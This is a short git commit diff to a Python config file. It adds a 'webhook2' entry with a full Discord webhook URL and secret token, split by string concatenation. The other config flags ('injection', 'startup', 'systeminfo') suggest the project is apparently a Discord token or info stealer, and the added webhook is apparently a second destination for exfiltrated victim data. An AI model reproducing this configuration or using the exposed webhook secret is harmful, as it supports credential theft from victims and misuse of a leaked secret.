016b49552a197f4ee79ba5cbca029bca9f89118b
MonstrumHD <70302161+MonstrumHD@users.noreply.github.com>
2023-01-21 17:48:02 -0800

    Update config.py

--- src/config.py
+++ src/config.py
@@ -6,4 +6,5 @@ __CONFIG__ = {
     'injection' : False,
     'startup' : False,
     'systeminfo' : False,
+    'webhook2' : 'https://discord.com/api/webhooks/'+'1066534123331657758/q-_nfsSfMLNdJ1ssHmteWCxe5xg1WgAKEAu3p0vGEWXW6J3t7th3QxchfQCJW4IdpJvz',
 }
